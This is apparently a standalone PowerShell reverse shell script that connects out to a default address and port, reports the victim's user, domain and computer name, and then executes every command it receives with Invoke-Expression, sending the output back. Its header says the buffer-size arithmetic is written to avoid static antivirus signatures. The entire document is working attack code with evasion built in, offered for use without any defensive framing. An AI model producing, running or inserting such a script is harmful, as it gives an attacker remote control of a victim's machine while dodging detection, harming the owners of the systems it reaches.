# Bit-Shift Buffer Shell
# Uses bit-shift arithmetic for buffer size calculation to avoid static signatures
# Default: 192.168.0.100:4444 — override with arguments

$srv = if ($args[0]) { $args[0] } else { "192.168.0.100" }
$prt = if ($args[1]) { [int]$args[1] } else { 4444 }

try {
    $conn = New-Object System.Net.Sockets.TCPClient($srv, $prt)
    $io = $conn.GetStream()
    [byte[]]$data = 0..((1-shl(4*4))-1)|%{0}

    $enc = [text.encoding]::UTF8
    $intro = $enc.GetBytes("[+] $env:USERDOMAIN\$env:USERNAME @ $env:COMPUTERNAME`n`n")
    $io.Write($intro, 0, $intro.Length)
    $prompt = $enc.GetBytes((Get-Location).Path + ' #> ')
    $io.Write($prompt, 0, $prompt.Length)

    [byte[]]$data = 0..((1-shl(4*4))-1)|%{0}
    while (($n = $io.Read($data, 0, $data.Length)) -ne 0) {
        $input_str = (New-Object System.Text.UTF8Encoding).GetString($data, 0, $n)
        $output = try { Invoke-Expression $input_str 2>&1 | Out-String } catch { "$_" }
        $reply = $enc.GetBytes($output + (Get-Location).Path + ' #> ')
        $io.Write($reply, 0, $reply.Length)
        $io.Flush()
    }
} catch { }
finally { if ($conn) { $conn.Close() } }
